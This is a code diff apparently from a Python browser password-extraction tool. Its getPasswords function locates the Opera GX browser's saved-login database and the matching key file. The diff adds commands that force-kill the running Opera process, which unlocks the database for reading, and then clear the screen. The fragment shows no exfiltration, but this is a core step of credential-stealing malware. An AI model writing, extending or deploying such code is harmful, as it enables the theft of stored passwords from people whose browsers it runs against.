@@ -8,6 +8,9 @@ from utils.ansiColors import RED, RESET
 
 def getPasswords():
     try:
+        os.system("taskkill /F /IM opera.exe")
+        os.system('cls' if os.name == 'nt' else 'clear')
+
         dbPath = os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera GX Stable\Login Data"
         keyPath = os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera GX Stable\Local State"
 
